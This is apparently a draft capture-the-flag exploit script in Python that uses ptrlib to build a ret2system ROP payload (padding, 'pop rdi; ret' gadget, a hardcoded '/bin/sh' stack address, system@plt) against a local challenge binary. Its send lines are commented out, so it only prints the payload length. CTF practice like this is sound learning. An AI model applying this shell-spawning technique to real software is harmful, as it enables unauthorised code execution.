#!/usr/bin/env python3
import ptrlib as ptr

elf = ptr.ELF("./chall")
io = ptr.Process(elf.filepath)

# io.sendline(b"hello")
payload = b"/bin/sh\x00"
payload += b"A" * 16
payload += ptr.p64(next(elf.gadget("ret")))
payload += ptr.p64(next(elf.gadget("pop rdi; ret")))
payload += ptr.p64(0x7FFFFFFFE570)  # /bin/sh\x00
payload += ptr.p64(elf.plt("system"))

# io.sendline(payload)
io.sendline("hello")
# io.sendline(b"A" * 0x30)
print(len(payload))

io.sh()
